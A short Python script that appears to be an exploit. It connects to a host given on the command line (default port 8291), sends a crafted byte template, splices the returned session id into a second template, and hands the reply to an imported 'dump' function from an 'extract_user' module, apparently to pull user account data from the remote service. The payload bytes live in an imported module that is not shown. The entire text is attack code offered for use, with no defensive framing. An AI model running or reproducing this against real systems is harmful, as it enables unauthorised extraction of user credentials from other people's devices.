import socket
import sys

from bytes import BYTE_A, BYTE_B
from extract_user import dump

if __name__ == '__main__':
    ip = sys.argv[1]

    if len(sys.argv) == 3:
        port = int(sys.argv[2])
    else:
        port = 8291

    # Initialize Socket
    s = socket.socket()
    s.settimeout(3)
    s.connect((ip, port))

    # Convert to bytearray for manipulation
    a = bytearray(BYTE_A)
    b = bytearray(BYTE_B)

    # Send hello and recieve the sesison id
    s.send(a)
    d = bytearray(s.recv(1024))

    # Replace the session id in template
    b[19] = d[38]

    # Send the edited response
    s.send(b)
    d = bytearray(s.recv(1024))

    # Get results
    print(ip)
    dump(d[55:])
